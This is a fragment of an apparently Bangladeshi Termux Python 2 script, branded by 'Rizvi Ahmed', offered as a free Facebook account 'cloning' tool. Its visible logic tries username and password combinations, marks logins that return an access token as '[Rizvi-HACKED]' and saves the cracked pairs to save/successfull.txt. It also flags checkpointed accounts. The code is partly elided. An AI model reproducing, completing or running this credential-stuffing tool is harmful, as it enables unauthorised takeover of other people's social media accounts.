#Tools Created By Rizvi Islam
#Rizvi Technology Channel
...
\033[0;94m              ____  _ ______    ______
   / __ \(_)__  / |  / /  _/
  / /_/ / /  / /| | / // /  
 / _, _/ /  / /_| |/ // /   
/_/ |_/_/  /____/___/___/
...
print("\033[0;91mThis Tool's Free By Rizvi Ahmed ")

psb('\x1b[1;92mBANGLADESH RIZVI 6 DIGIT CLONING START PLEASE WAIT .....')
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Rizvi Ahmed'
    print '\033[0;94mFACEBOOK : Termux teacher Rizvi'
    print '\033[0;96mGITHUB   : TermuxRizvi'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Rizvi-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Rizvi-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
